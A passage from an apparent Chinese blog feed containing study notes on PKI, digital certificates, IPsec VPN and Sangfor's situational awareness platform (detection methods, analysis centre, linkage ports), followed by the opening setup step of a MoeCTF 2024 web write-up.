src="https://www.helloimg.com/i/2024/12/15/675dba2f3cbef.png"></p><p><img src="https://www.helloimg.com/i/2024/12/15/675dba47380d0.png"></p><ul><li>常见非对称加密算法</li></ul><p><img src="https://www.helloimg.com/i/2024/12/15/675dbb08a7098.png"></p><ul><li>对比对称与非对称</li></ul><p><img src="https://www.helloimg.com/i/2024/12/15/675dbb34473d8.png"></p><h5 id="身份认证技术"><a href="#身份认证技术" class="headerlink" title="身份认证技术"></a>身份认证技术</h5><p>身份认证：通过标识和鉴别用户的身份，防止攻击者假冒合法用户来获取访问权限。<br>身份认证技术：是在网络中确认操作者身份的过程而产生的有效解决方法。</p><p>A和B：（RSA）</p><p>数字签名是证明发送者就是发送者的东西，检查发送者的数据是否被篡改</p><p>初始版本：A给B发送信息，A用B的公钥加密，B用自己的私钥解密</p><p>现在版本：A要发送的数据进行HASH得到数字摘要，A用A的私钥加密数字摘要之后发送给B，B用A的公钥解密得到数字摘要，然后对比数字摘要是否被篡改，并且确认信息就是由A发过来的，但是黑客可以在B的电脑上把A的公钥换成自己伪造的公钥，于是B不能确定自己电脑上的A的公钥是不是A的，于是有了数字证书</p><p>那么此时A要去CA机构，让CA机构用自己的私钥对数字证书进行签名，然后接收者B要去用CA的公钥解开数字证书，拿到数字证书中A的的公钥，再用A的公钥解密数字签名，得到信息摘要，然后比对</p><p><img src="https://www.helloimg.com/i/2024/12/15/675e4735a83f0.png"></p><h6 id="PKI体系"><a href="#PKI体系" class="headerlink" title="PKI体系"></a>PKI体系</h6><p>​PKI(公开密钥体系，PublicKeyInfrastructure)是一种遵循标准的利用非对称加密技术为电子商务的开展提供一套安全基础平台的技术和规范。<br>​简单来说，PKI就是利用公钥理论和技术建立的提供安全服务的基础设施。用户可利用PKI平台提供的服务进行安全的电子交易、通信和互联网上的各种活动。<br>​PKI技术采用证书管理公钥，通过第三方的可信任机构–CA认证中心把用户的公钥和用户的其他标识信息捆绑在一起放在用户证书中，在互联网上验证用户的身份。<br>​目前，通用的办法是采用建立在PKI基础之上的数字证书，通过把要传输的数字信息进行加密和签名，保证信息传输的机密性、真实性、完整性和不可否认性，从而保证信息的安全传输。</p><ol><li>PKI体系组成</li></ol><p>PKI是创建、颁发、管理、注销公钥证书所涉及到的所有软件、硬件的集合体。其核心元素是数字证书，核心执行者是CA认证机构。</p><img src="https://www.helloimg.com/i/2024/12/15/675e49c9ceaf7.png" style="zoom:67%;"><h6 id="CA中心"><a href="#CA中心" class="headerlink" title="CA中心"></a>CA中心</h6><p>CA中心，即证书授权中心(Certificate Authority)，或称证书授权机构，作为电子商务交易中受信任的第三方。</p><p><img src="https://www.helloimg.com/i/2024/12/15/675e4ad64811f.png"></p><p>CA中心的作用：签发证书、规定证书的有效期和通过发布证书废除列表(CRL)确保必要时可以废除证书，以及对证书和密钥进行管理。</p><p>CA中心为每个使用公开密钥的用户发放一个数字证书，数字证书的作用是证明证书中列出的用户合法拥有证书中列出的公钥。</p><p>CA中心的数字签名使得攻击者不能伪造和篡改证书。</p><h6 id="数字证书认证技术原理"><a href="#数字证书认证技术原理" class="headerlink" title="数字证书认证技术原理"></a>数字证书认证技术原理</h6><p>数字证书：一个经<strong>证书授权中心数字签名</strong>的包含<strong>公开密钥拥有者信息</strong>和<strong>公开密钥</strong>的文件</p><p>数字证书一般包含:</p><ul><li>用户身份信息</li><li>用户公钥信息</li><li>身份验证机构数字签名的数据</li></ul><p>从证书用途来看，数字证书可分为<strong>签名证书</strong>和<strong>加密证书</strong></p><ul><li>签名证书：主要用于对用户信息进行签名，以保证信息的真实性和不可否认性</li><li>加密证书：主要用于对用户传送的信息进行加密，以保证信息的机密性和完整性。</li></ul><p>常见证书类型</p><ul><li>数字证书</li><li>根证书：CA自己给自己下发的证书</li><li>用户证书：CA给个人下发的证书，一般存放于个人的浏览器中</li><li>设备证书：也叫做服务器证书</li></ul><p><img src="https://www.helloimg.com/i/2024/12/15/675e4d50b2a4a.png"></p><p>数字证书实例–HTTPS协议</p><p>​HTTP是常用的web协议，用来交互网页数据。由于HTTP是不加密的，在公网上明文传输，缺少保密性。所以出现了安全加密的HTTP协议—HTTPS协议。HTTPS是在SSL协议基础上的HTTP协议<br>​SSL协议的握手过程需要<strong>传输服务器的证书</strong>，并验证证书的可靠性。</p><p><img src="https://www.helloimg.com/i/2024/12/15/675e4fb2144df.png"></p><p>服务器证书是由CA机构颁发，用户浏览器中存在一些可信任的CA机构的列表，如果服务器证书颁发机构不在这个列表中，那么就会弹出证书不可信的提示。</p><p>服务器证书中包含了服务器的公钥，用户浏览器验证成功后，会用服务器的公钥进行加密传输</p><h4 id="4-5-2-IPsec-VPN解决方案"><a href="#4-5-2-IPsec-VPN解决方案" class="headerlink" title="4.5.2 IPsec VPN解决方案"></a>4.5.2 IPsec VPN解决方案</h4><h5 id="IPSEC协议簇安全框架"><a href="#IPSEC协议簇安全框架" class="headerlink" title="IPSEC协议簇安全框架"></a>IPSEC协议簇安全框架</h5><ol><li>需求背景</li></ol><ul><li>对保密性的需求越来越高</li><li>GRE、L2TP等VPN技术不支持保密性的要求</li></ul><p>于是有了IPSec</p><ol start="2"><li>IPSec VPN简介</li></ol><p>​IPSec(Internet Protocol Security)：是一组基于<strong>网络层</strong>的，应用密码学的安全通信协议族。IPSec不是具体指哪个协议，而是一个开放的协议族。</p><p>​IPSec协议的设计目标：是在IPV4和IPV6环境中为网络层流量提供灵活的安全服务</p><p>​IPSeC VPN：是基于IPSec协议族构建的在IP层实现的安全虚拟专用网。通过在数据包中<u>插入一个预定义头部的方式</u>来保障OSI上层协议数据的安全，主要用于保护TCP、UDP、ICMP和隧道的IP数据包。</p><ol start="3"><li>IPSec提供的安全服务</li></ol><p><img src="https://www.helloimg.com/i/2024/12/15/675ed0ea31c71.png"></p><ol start="4"><li>IPSec协议族安全体系框架</li></ol><p><img src="https://www.helloimg.com/i/2024/12/15/675ed176564d5.png"></p><h5 id="IPSEC工作模式"><a href="#IPSEC工作模式" class="headerlink" title="IPSEC工作模式"></a>IPSEC工作模式</h5><h5 id="IPSEC通信协议"><a href="#IPSEC通信协议" class="headerlink" title="IPSEC通信协议"></a>IPSEC通信协议</h5><h5 id="IPSEC建立阶段"><a href="#IPSEC建立阶段" class="headerlink" title="IPSEC建立阶段"></a>IPSEC建立阶段</h5><h5 id="IPSEC-VPN应用场景"><a href="#IPSEC-VPN应用场景" class="headerlink" title="IPSEC VPN应用场景"></a>IPSEC VPN应用场景</h5><h4 id="4-5-3-SANGFOR-VPN解决方案"><a href="#4-5-3-SANGFOR-VPN解决方案" class="headerlink" title="4.5.3 SANGFOR VPN解决方案"></a>4.5.3 SANGFOR VPN解决方案</h4><h4 id="4-5-4-AutoVPN功能"><a href="#4-5-4-AutoVPN功能" class="headerlink" title="4.5.4 AutoVPN功能"></a>4.5.4 AutoVPN功能</h4><h4 id="4-5-5-BBC部署及设备管控功能"><a href="#4-5-5-BBC部署及设备管控功能" class="headerlink" title="4.5.5 BBC部署及设备管控功能"></a>4.5.5 BBC部署及设备管控功能</h4><h4 id="4-5-6-BBC分支序列号批量更新及平台告警功能"><a href="#4-5-6-BBC分支序列号批量更新及平台告警功能" class="headerlink" title="4.5.6 BBC分支序列号批量更新及平台告警功能"></a>4.5.6 BBC分支序列号批量更新及平台告警功能</h4><h4 id="4-5-7-BBC常见使用场景"><a href="#4-5-7-BBC常见使用场景" class="headerlink" title="4.5.7 BBC常见使用场景"></a>4.5.7 BBC常见使用场景</h4><h4 id="4-5-8-VPN内网服务选路功能"><a href="#4-5-8-VPN内网服务选路功能" class="headerlink" title="4.5.8 VPN内网服务选路功能"></a>4.5.8 VPN内网服务选路功能</h4><h3 id="第六部分-态势感知基础原理与运维"><a href="#第六部分-态势感知基础原理与运维" class="headerlink" title="第六部分 态势感知基础原理与运维"></a>第六部分 态势感知基础原理与运维</h3><blockquote><p>SIP：态势感知平台</p></blockquote><h4 id="4-6-1-安全感知平台功能说明-监控和大屏"><a href="#4-6-1-安全感知平台功能说明-监控和大屏" class="headerlink" title="4.6.1 安全感知平台功能说明-监控和大屏"></a>4.6.1 安全感知平台功能说明-监控和大屏</h4><ol><li>监控中心</li></ol><p>（1）用途：</p><p>​监控中心用于<strong>显现全网的安全事件总览</strong>，并呈现存在的主机或安全事件的数据统计情况，并可查看主要功能模块存在问题的top5情况。</p><p>（2）板块：</p><p>接入设备状态、综合安全感知、业务安全感知、终端安全感知、威胁感知、资产感知、安全播报</p><p>（3）安全检测清单：用于对当前SIP检测出来的安全事件，统计出各类安全事件当前存在多少风险主机，以及处理进度情况如何。</p><p>（4）挖矿专项检测：黑客可以通过挖矿获得收益，所以挖矿事件也较多，该功能模块可以对全网出现挖矿的安全事件进行统一展示，<strong>检测当前存在挖矿各阶段的主机数量</strong>，更直观了解挖矿的安全态势，及时进行处置。</p><ol start="2"><li>大屏可视</li></ol><p>（1）安全类</p><ul><li>综合安全态势大屏：全局总览整体安全态势，包括“事前”资产态势、脆弱性态势、“事中”攻击态势，以及“事后”安全事件态势等;同时，也能以安全域的视角直观地看清风险所在区域。</li><li>分支安全态势大屏：在多分支单位场景时，直观地、全局地监控各健的安全态势以及排行。</li><li>通报预警大屏</li><li>安全事件态势大屏：监控<strong>内网</strong>发生安全事件的情况，对近期网络安全行业中发生的风险进行监控。</li><li>网络攻击态势大屏：监控来自<strong>外部</strong>的攻击，直观展示内部网络在全球范围内面临的攻击威胁，攻击源地理位置、攻击手段，被攻击业务一目了然。</li><li>网络攻击态势大屏-3D(需要独显支持)</li><li>外连风险监控大屏：监控业务的风险<strong>外连情况态势</strong>，业务系统对外部发起的攻击、C&amp;C通信、违规访问等。</li><li>横向威胁监控大屏：监控<strong>内部横向的威胁</strong>，看清来自内部的威胁，包含内对内的攻击违规访问、可疑行为、风险访问。</li><li>脆弱性态势大屏</li></ul><p>（2）访问关系类</p><ul><li>正常横向访问监控大屏</li><li>正常外连监控大屏</li></ul><p>（3）资产&amp;接入设备类</p><ul><li>资产态势大屏</li><li>设备运行态势大屏</li></ul><p>（4）重保类</p><ul><li>重大活动网络安全指挥调度大屏</li></ul><ol start="3"><li>大屏功能扩展</li></ol><ul><li>每个大屏可以在“设置”中进行一定程度的自定义，如修改大屏标题，或者增加或减少大屏展示的内容。</li><li>可以在大屏上实现实时告警功能，当出现安全事件后，会在大屏上出现告警的贴图。</li><li>若只有一个大屏需要将所有的大屏投放时，可以全貌和大屏轮播投屏，可自定义间隔时间。</li><li>将鼠标放至大屏上可看到大屏的作用描述，如下一页图:</li></ul><h4 id="4-6-2-安全感知平台功能说明-处置中心"><a href="#4-6-2-安全感知平台功能说明-处置中心" class="headerlink" title="4.6.2 安全感知平台功能说明-处置中心"></a>4.6.2 安全感知平台功能说明-处置中心</h4><ol><li>处置中心</li></ol><p>​安全感知平台最关键的模块，用于查看当前网络中<strong>存在的风险主机</strong>(服器器、PC终端)以及网络中存在的<strong>安全事件</strong>。<strong>安全感知平台无处置功能</strong>，能分析出当前的网络中存在的问题，需要人工或使用杀软等工具对该模块中的待处置主机进行处置操作，完成安全问题闭环</p><p>处置中心将全网安全问题，通过风险主机(服务器、终端)视角、安全域视角、安全事件视角进行整理。</p><ul><li>当管理员习惯查看哪些主机存在安全问题时，可以通过<strong>风险业务视角</strong>或<strong>风险终端视角</strong>进行查看。</li><li>当管理员想知道哪个区域安全较薄弱时，可以通过<strong>风险安全域视角</strong>进行确认。</li><li>当公司出现了某项安全事件时，如勒索病毒，可以通过<strong>安全事件视角</strong>进行查找所有中勒索病毒的主机。</li></ul><ol start="2"><li>数据分析和监控</li></ol><ul><li>基于NTA技术、利用人工智能分析**(南北向与东西向)流量和载荷文件**，从而识别异常协议、异常流量、主机异常行为;</li><li>匹配机制问题: 传统安全设备的判断机制是特征匹配，<strong>需要通过异常检测</strong>的方式才有可能识别出可疑攻击行为，0day、特种木马、隐蔽通道传输等未知攻击;</li><li>监控<strong>网络流量、资产、设备</strong>，建模学习日常网络行为，这样对异常的连接、数据交互、用户变更等可以实现安全可视和追踪。</li></ul><p><img src="https://pic.imgdb.cn/item/6700d901d29ded1a8cb4bb72.png"></p><ol start="3"><li>检测手段</li></ol><p><img src="https://pic.imgdb.cn/item/6700d96cd29ded1a8cb51ec3.png"></p><p>（1）DGA检测</p><blockquote><p>DGA（Domain Generation Algorithm）检测是指识别和分析利用域名生成算法（DGA）生成的域名的技术。DGA通常用于恶意软件和网络攻击中，以便通过频繁改变的域名来隐蔽其命令和控制（C&amp;C）服务器。</p></blockquote><p>DGA检测的主要方法包括：</p><ol><li><strong>域名分析</strong>：监控和分析网络流量中的域名请求，以识别异常或可疑的域名模式。</li><li><strong>机器学习</strong>：使用机器学习模型训练历史数据，对域名的生成方式进行分类，从而检测是否符合DGA的特征。</li><li><strong>规则基检测</strong>：构建特定的规则或特征集，识别符合DGA生成模版的域名。</li><li><strong>黑名单对比</strong>：将所生成的域名与已知的DGA域名黑名单进行比对，进行自动检测。</li><li><strong>行为检测</strong>：分析不寻常的网络行为，比如频繁连接未知域名等，以寻找潜在的DGA活动。</li></ol><p>（2）APT检测</p><blockquote><p>APT（Advanced Persistent Threat，高级持续性威胁）检测是指识别和响应针对特定目标的复杂攻击，这些攻击通常由组织化的攻击者发起。APT攻击通常以长时间潜伏、精心规划和持续攻击为特征，其目标往往是窃取敏感信息或破坏关键基础设施。</p></blockquote><p>APT检测的主要方法包括：</p><ol><li><strong>网络流量监测</strong>：实时监控网络流量，寻找异常流量模式、可疑的通信行为或者大量数据传输。</li><li><strong>行为分析</strong>：采用动态行为分析技术，将系统的正常行为基线建立起来，识别出偏离正常行为的可疑活动。</li><li><strong>终端检测与响应（EDR）</strong>：在终端设备上部署监测工具，检测恶意软件、可疑的文件活动和异常进程。</li><li><strong>指标与恶意活动（IOCs）</strong>：使用已知的APT攻击指标（如IP地址、域名、文件哈希等）进行对比检测。</li><li><strong>多层防御</strong>：结合边界防护、入侵检测系统（IDS）、入侵防御系统（IPS）等技术，形成全面的安全防护体系。</li><li><strong>安全信息与事件管理（SIEM）</strong>：集中收集和分析来自不同安全设备和系统的日志，以识别潜在的APT活动。</li><li><strong>用户行为分析（UBA）</strong>：监测用户行为模式，识别内部威胁或被入侵账户的异常活动。</li><li><strong>红队与蓝队演练</strong>：通过模拟攻击（红队）与防御（蓝队）演练，评估和提高组织的APT侦测与响应能力。</li></ol><p>（3）数据泄露检测</p><blockquote><p>数据泄露检测是识别和防止敏感信息未经授权访问、使用或披露的重要过程。数据泄露可能会导致财务损失、声誉损害、法律责任等问题。检测数据泄露的主要方法和策略包括：</p></blockquote><ol><li><p><strong>数据丢失防护（DLP）</strong>：</p><ul><li>部署DLP解决方案，监控和控制终端、网络和存储设备上的敏感数据使用。</li><li>设置策略，防止对敏感数据的未经授权访问和传输。</li></ul></li><li><p><strong>网络流量监控</strong>：</p><ul><li>实时监控网络流量，识别异常数据传输，尤其是大量数据向外部网络的发送。</li><li>使用入侵检测系统（IDS）和入侵防御系统（IPS）检测可疑行为。</li></ul></li><li><p><strong>用户行为分析（UBA）</strong>：</p><ul><li>分析用户的正常行为模式，识别异常活动，如账户被入侵后的权限提升或数据访问。</li><li>关注高风险用户的异常登录行为和数据访问模式。</li></ul></li><li><p><strong>日志监控与分析</strong>：</p><ul><li>集中收集和分析应用、服务器和网络设备的日志，以发现潜在的数据泄露迹象。</li><li>使用安全信息和事件管理（SIEM）工具，进行实时监控和警报。</li></ul></li><li><p><strong>敏感数据分类和标记</strong>：</p><ul><li>对敏感数据进行分类和标记，确保被识别和保护。</li><li>使用加密技术保护静态和传输中的敏感数据。</li></ul></li><li><p><strong>资产和漏洞管理</strong>：</p><ul><li>定期进行网络和应用程序的安全审计，识别漏洞和潜在的泄露风险。</li><li>采取补救措施，确保系统和应用程序的安全性。</li></ul></li><li><p><strong>用户教育与培训</strong>：</p><ul><li>为员工提供安全意识培训，帮助他们识别社会工程攻击和数据泄露的风险。</li><li>强调安全最佳实践，减少人为错误导致的数据泄露风险。</li></ul></li><li><p><strong>第三方安全评估</strong>：</p><ul><li>对供应链和第三方服务提供商进行安全评估，确保其遵循数据保护政策。</li><li>签署保密协议，限制对敏感数据的访问。</li></ul></li><li><p>传统引擎和人工智能引擎的比较</p></li></ol><p><img src="https://pic.imgdb.cn/item/6700dbecd29ded1a8cb7677f.png"></p><ol start="5"><li>风险等级</li></ol><p><img src="https://pic.imgdb.cn/item/6700dccfd29ded1a8cb83280.png"></p><p>SIP对事件通过“失陷确定性”、“威胁等级”两个维度进行定级。</p><ul><li><p>失陷确定性：是对<strong>主机风险评级</strong>的主要指标。</p><ul><li>优先查看报的已失陷与高危等级事件，这些事件准确性较高，容易查出问题</li><li>对于中危和低危事件，需要进一步的分析排查，去确认事件，需要一定的安全分析能力。</li></ul></li><li><p>威胁等级：是主机对<strong>内网或外网造成威胁</strong>的评级指标。</p><ul><li>威胁等级是风险主机对内网或外网主机发起的攻击行为，如病毒的扩散事件，是对内网有威胁的，肉鸡对互联网发起攻击将会被监管单位进行通报。</li><li>如下图，是主机对内网发起永恒之蓝漏洞利用攻击，以及对互联网发起数据库扫描攻击，描述了方向。</li></ul></li></ul><h4 id="4-6-3-安全感知平台功能说明-分析中心"><a href="#4-6-3-安全感知平台功能说明-分析中心" class="headerlink" title="4.6.3 安全感知平台功能说明-分析中心"></a>4.6.3 安全感知平台功能说明-分析中心</h4><ol><li>分析中心的作用说明</li></ol><p>（1）分析中心结合了深信服安全感知平台的可视化威胁追捕、源分析、情报关联、行为分析等技术<strong>提供的可视化数据呈现</strong>，展现那些暂未形成安全事件，但存在可疑，或结合业务现状可分析发现存在异常的数据，提供给驻点安全专家，或有一定安全分析能力的运维人员进行分析，从正常现象中挖掘异常。查看主机存在的外部、横向、外连，三个方向的威胁以及访问情况进行分析。对恶意文件以及邮件威胁可以直接查看到。<br>（2）对2U的SIP平台还可以使用SIEM与EBA发现更多的主机风险，可以全方位的对安全事件进行识别。</p><ol start="2"><li>功能说明</li></ol><p>（1）分析中心包括了外部、横向、外连三个方向的安全与访问关系，并对数据传输中的文件威胁和邮件威胁做出了单向的检测展示<br>（2）对访问情况，平台还将识别其访问次数以及访问流量，并通过机器学习出基线识别出异常，通过EBA(行为画像)展示。<br>（3）若在有第三方操作系统以及第三方设备可以接入到SIP时，会通过SIEM进行关联分析。</p><ol start="3"><li>分析中心功能介绍</li></ol><p>（1）<u>威胁分析</u></p><ul><li>来自互联网，内网的攻击，包括外部威胁、横向威胁，外连威胁和文件威胁、邮件威胁检测。</li></ul><p>（2）<u>访问分析</u></p><ul><li>检测互联网，内网主机的访问关系，审计访问行为。</li></ul><p>（3）<u>日志检索</u></p><ul><li>平台审计的安全日志，审计日志以及第三方日志等。</li></ul><p>（4）<u>情报分析</u></p><ul><li>查看当前平台的威胁情报总量，检测到内网存在威胁情报的情况，并可自定义威胁情报以及将误报的情报加入白名单。</li></ul><p>（5）<u>SIEM分析系统</u></p><ul><li>通过接入第三方设备/操作系统日志进行异常行为分析。</li></ul><p>（6）<u>行为分析(EBA)</u></p><ul><li>通报机器学习，建立服务器访问基线，为后续识别出服务器的异常流量以及异常访问等</li></ul><ol start="4"><li>威胁分析</li></ol><p>（1）外部威胁分析</p><p>​来自互联网的攻击，包括总览、高危攻击、残余攻击、外部风险访问等。快速识别到互联网的攻击，可用于分析入口点。</p><p>（2）横向威胁分析</p><p>​来自内网主机的攻击行为，包括横向攻击、违规访问、可疑行为等。</p><p>（3）外连威胁分析</p><p>​内网主机主动向互联网发起的攻击行为或异常连接，包括对外攻击，C&amp;C通信<a href="C&amp;C%E9%80%9A%E4%BF%A1%E9%80%9A%E5%B8%B8%E4%B8%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3%EF%BC%8C%E9%BB%91%E5%AE%A2%E9%80%9A%E8%BF%87C&amp;C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%91%E8%A2%AB%E6%84%9F%E6%9F%93%E7%9A%84%E8%AE%BE%E5%A4%87%E5%8F%91%E9%80%81%E6%8C%87%E4%BB%A4%EF%BC%8C%E6%8E%A7%E5%88%B6%E5%85%B6%E8%A1%8C%E4%B8%BA%E3%80%82%E8%BF%99%E7%A7%8D%E9%80%9A%E4%BF%A1%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E7%AA%83%E5%8F%96%E6%95%B0%E6%8D%AE%E3%80%81%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E6%8C%87%E4%BB%A4%E6%88%96%E8%80%85%E8%BF%9B%E8%A1%8C%E5%85%B6%E4%BB%96%E6%81%B6%E6%84%8F%E6%B4%BB%E5%8A%A8%E3%80%82">^2</a>，隐蔽通信等。</p><p>（4）文件威胁分析</p><p>​STA审计到的文件，上传到SIP通过分析引擎进行识别是否为恶意文件。</p><p>（5）邮件威胁分析</p><p>​包括钓鱼邮件、垃圾邮件以及病毒邮件的检测分析。</p><p>​威胁分析—-分析中心是用于更高级的安全事件分析工具，较处置中心，需要更强的安全分析能力。如当在处置中心中发现一台主机的威胁等级为中危、低危时，可以通过分析中心对该主机进行外部、横向、外连等维度的威胁分析。</p><ol start="5"><li>访问分析功能概述</li></ol><ul><li>横向访问分析<ul><li>通过<strong>探针</strong>审计横向访问流量分析出服务器流量排行以及内网最活跃的源主机。</li></ul></li><li>外连分析<ul><li>识别<strong>内网主机</strong>访问互联网的情况，分析服务器和终端，是否访问到没有业务的地域行为。</li></ul></li><li>外对内业务流量分析<ul><li>审计互联网对DMZ区业务的访问情况，识别出是否有异常的大流量访问或大量的访问次数</li></ul></li><li>可疑DNS分析<ul><li>探针审计到内网主机访问了一些异常的DNS访问请求</li></ul></li><li>访问控制核查<ul><li>配置好需要核查的关系，通过探针进行审计，是否存在该访问关系。</li></ul></li></ul><ol start="6"><li>日志检索</li></ol><p>​日志检索是最原始的数据源，其中有安全日志也有审计日志，上述的分析中心模块是已经将日志检索中的日志进行聚合的结果，只在需要分析单条日志时才使用日志检索</p><ul><li>日志类型选择<ul><li>用于筛选安全日志，审计日志以及第三方接入设备/操作系统日志，进行分类查询</li></ul></li><li>搜索框<ul><li>可以自定义输入查询的字段，搜索技巧可以查看帮助文档。</li></ul></li><li>日志方向<ul><li>在分析日志时，可能有时需要只筛选某个方向上的日志，可以使用此功能</li></ul></li><li>重点/可选字段<ul><li>在检索到的日志时，有一些字段默认未展示，可以手动添加重点或可选字段</li></ul></li><li>解码小助手<ul><li>在检索到日志后发现日志是ur1，base64等常见编码时，可以使用解码小助手解码<br>  查看分析。</li></ul></li></ul><ol start="7"><li>SIEM分析系统</li></ol><p>通过接入第三方安全设备(如防火墙、IPS、IDS、WAF、终端安全等)、网络设备(如路由器、交换机等)、操作系统(如windows、linux各系列)、中间件(web中间件如apache等，数据库中间件如Mysql、Sqlserver等中间件)等日志数据进行关联分析，结合A1机器学习和数据挖掘技术发现安全威胁和安全风险，结合可视化呈现构造多源化监视和分析的安全系统，目的旨在帮助用户通过多源数据分析检测威胁和溯源(2U设备支持关联分析)</p><ol start="8"><li>行为分析（EBA）</li></ol><p>​UEBA采用流式计算框架，产生的日志以流的形式不断的输入到分析引擎，分析引擎以最近一段时间(7~30天)的数据为基础进行学习，学习正常的行为式，对于偏离正常基线的行为做出异常告警。<br>​UEBA可以检测传统工具看不到的安全事件，因为这些安全事件不符合预定义的相关规则或攻击模式，或者因为它们跨越多个组织系统和数据源。UEBA代表了对传统SIEM系统的重要改进。首先，它克服了SIEM关联规则的局限性，其次在许多情况下整个关联规则模型被打破的现实。</p><h4 id="4-6-4-安全感知平台功能说明-资产和报告中心"><a href="#4-6-4-安全感知平台功能说明-资产和报告中心" class="headerlink" title="4.6.4 安全感知平台功能说明-资产和报告中心"></a>4.6.4 安全感知平台功能说明-资产和报告中心</h4><ol><li>资产中心</li></ol><ul><li><p>资产感知</p><ul><li>资产识别目是<strong>STA探针</strong>产品的一个重要功能，目的旨在<strong>帮助用户梳理资产</strong>，识别风险资产(如影子资产)，为攻击检测提供辅助等。目前探针主要使用被动识别以及主动识别进行资产识别，被动识别主要根据网络流量镜像到探针，探针根据镜像流量进行内网识别，内网资产梳理;主动识别是探针进行发包主动探测内网资产，再进行数据汇总与分析。</li><li>平台识别到的资产将定义为内网资产，在为后续识别横向、外连、外部威胁或访问关系定义方向，需要事先定义好内部IP组或者分支IP范围。</li></ul></li><li><p>脆弱性感知</p><ul><li>有脆弱性总览</li><li>检测弱密码、http明文传输</li><li>配置风险：检测风险端口、授权配置不当</li></ul></li></ul><ol start="2"><li>报告中心</li></ol><ul><li>安全风险报告：包括自动生成的预设报告以及手动导出的报告，也可以订阅报告，用于汇报，安全运维等方面。</li><li>安全告警：当检测到安全事件时，会通过邮件或者短信的方式发送告警信息给管理员</li></ul><ol start="3"><li>联动响应</li></ol><ul><li>联动响应功能的引入:</li></ul><p>​大家都知道SIP只做为安全事件的检测，无法对检测到的安全问题进行闭环</p><p>当前的两类安全问题闭环方式</p><p>1、MDR服务，通过购买安全服务，由安服人员对安全问题进行处置闭环(培训中不进行说明)<br>2、通过与深信服其它产品进行联动，如AF/EDR等，在SIP上下发策略对问题进行处置闭环。</p><ul><li>三部分</li></ul><p><img src="https://pic.imgdb.cn/item/6729ce99d29ded1a8c98dac3.png"></p><ul><li>联动端口使用说明</li></ul><p><img src="https://pic.imgdb.cn/item/6729cf22d29ded1a8c99491c.png"></p><table><thead><tr><th align="center">方向</th><th align="center">端口</th></tr></thead><tbody><tr><td align="center">AC–&gt;SIP（检测到威胁上传给态势感知平台）</td><td align="center">1775</td></tr><tr><td align="center">SIP–&gt;AC（下发封锁策略）</td><td align="center">7443/9998</td></tr></tbody></table><p>AC：上网行为管理SIP：态势感知平台</p><table><thead><tr><th align="center">方向</th><th align="center">端口</th></tr></thead><tbody><tr><td align="center">AF–&gt;SIP（检测到威胁上传给态势感知平台）</td><td align="center">4430</td></tr><tr><td align="center">SIP–&gt;AF（下发封锁策略）</td><td align="center">7743</td></tr></tbody></table><p>AF：防护墙SIP：态势感知平台</p><p><img src="https://pic.imgdb.cn/item/6729d096d29ded1a8c9a97cc.png"></p><table><thead><tr><th align="center">方向</th><th align="center">端口</th></tr></thead><tbody><tr><td align="center">EDR–&gt;SIP（检测到威胁上传给态势感知平台）</td><td align="center">7443</td></tr><tr><td align="center">SIP–&gt;EDR（下发封锁策略）</td><td align="center">443</td></tr></tbody></table><p>EDR：终端安全检测SIP：态势感知平台</p><h4 id="4-6-5-SIP平台日常运营使用"><a href="#4-6-5-SIP平台日常运营使用" class="headerlink" title="4.6.5 SIP平台日常运营使用"></a>4.6.5 SIP平台日常运营使用</h4><h4 id="4-6-6-安全感知平台产品对接"><a href="#4-6-6-安全感知平台产品对接" class="headerlink" title="4.6.6 安全感知平台产品对接"></a>4.6.6 安全感知平台产品对接</h4><h4 id="4-6-7-级联功能专项培训"><a href="#4-6-7-级联功能专项培训" class="headerlink" title="4.6.7 级联功能专项培训"></a>4.6.7 级联功能专项培训</h4><p>[^3]:RADIUS（Remote Authentication Dial-In User Service）协议是一种用于身份验证、授权和计费的网络协议。它广泛应用于各种网络环境中,主要用于验证远程访问用户的身份。<br>[^4]:EAP 终结方式要求 RADIUS 服务器负责完成整个 EAP 身份验证过程。RADIUS 服务器与客户端(如无线接入点)之间使用 RADIUS 协议进行通信。RADIUS 服务器执行 EAP 认证方法,并将最终的认证结果返回给客户端。这种方式简化了客户端的实现,但要求 RADIUS 服务器具有更强的计算能力。<br>[^5]:EAP 透传方式下,RADIUS 服务器不参与 EAP 身份验证过程本身。客户端与 RADIUS 服务器之间使用 RADIUS 协议进行通信,但 EAP 帧是透明地传递的。EAP 认证方法在客户端和终端用户设备之间直接执行,RADIUS 服务器只负责转发 EAP 帧。这种方式将 EAP 认证过程分散到客户端和用户设备上,减轻了 RADIUS 服务器的负担。<br>[^6]:哑终端主要用于输入和输出数据,没有复杂的数据处理和应用程序功能。它们通常只能执行基本的数据显示、键盘输入等功能。哑终端完全依赖于连接的主机或服务器来执行计算和数据处理。它们没有自己的操作系统和本地应用程序,只是充当主机的输入/输出设备。<br>[^7]:VoIP（Voice over Internet Protocol）最初是用于语音通信，但现在也扩展到视频通信。它允许用户通过网络进行实时视频通话，而不是传统的电话系统</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深信服 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF 2024 Web渗透测试与审计</title>
      <link href="/2024/08/12/moectf-2024-web-shen-tou-ce-shi-yu-shen-ji/"/>
      <url>/2024/08/12/moectf-2024-web-shen-tou-ce-shi-yu-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="MoeCTF-2024–Web渗透测试与审计"><a href="#MoeCTF-2024–Web渗透测试与审计" class="headerlink" title="MoeCTF 2024–Web渗透测试与审计"></a>MoeCTF 2024–Web渗透测试与审计</h1><h2 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h2><h3 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h3><p>下载附件，附件提示，搭个php网站访问即可获得flag（本地搭一个就行）</p><p>整体说一下思路吧，首先得有一个phpstudy，将页面文件放到apache服务的访问页面的默认目录，开启apache服务，直接127.0.0.1访问对应网页文件就可以，现在来操作一遍吧！</p><ol><li>配置网站目录，将页面文件放到网站目录下</li></ol><p><img src="https://pic.imgdb.cn/item/66b9ef29d9c307b7e913a5a5.png"></p><ol start="2"><li>开启服务</li></ol><p><img 